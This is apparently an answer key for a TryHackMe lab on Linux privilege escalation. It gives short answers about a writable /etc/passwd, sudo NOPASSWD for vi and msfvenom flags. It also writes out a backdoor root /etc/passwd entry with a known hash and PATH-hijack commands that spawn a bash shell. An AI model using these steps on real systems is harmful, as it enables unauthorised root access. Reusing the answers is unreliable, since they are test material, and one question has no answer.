# TryHackMe Common Linux Privesc

> Saikat Karmakar | Aug 16 : 2021

---


## Task 4

1. What is the target's hostname?
```
polobox
```
2. Look at the output of /etc/passwd how many "user[x]" are there on the system?
```
8
```
3. How many available shells are there on the system?
```
4
```
4. What is the name of the bash script that is set to run every 5 minutes by cron?
What critical file has had its permissions changed to allow some users to write to it?
```
/etc/passwd
```

## Task 5

1. What is the path of the file in user3's directory that stands out to you? 
```
/home/user3/shell
```

## Task 6

1. Having read the information above, what direction privilege escalation is this attack?
```
vertical
```
2. Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: "openssl passwd -1 -salt [salt] [password]"
What is the hash created by using this command with the salt, "new" and the password "123"?
```
$1$new$p7ptkEKU1HnaHpRtzNizS1
```
3. Great! Now we need to take this value, and create a new root user account. What would the /etc/passwd entry look like for a root user with the username "new" and the password hash we created before?
```
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root/root:/bin/bash
```

## Task 7

1.  Let's use the "sudo -l" command, what does this user require (or not require) to run vi as root?
```
NOPASSWD
```

## Task 8

1. What is the flag to specify a payload in msfvenom?
```
-p
```
2. What directory is the "autoscript.sh" under?
```
/home/user4/Desktop
```

## Task 9

1. Let's go to user5's home directory, and run the file "script". What command do we think that it's executing?
```
ls
```
2. What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating
```
echo "/bin/bash" > ls
```
3. Great! Now we've made our imitation, we need to make it an executable. What command do we execute to do this?
```
chmod +x ls
```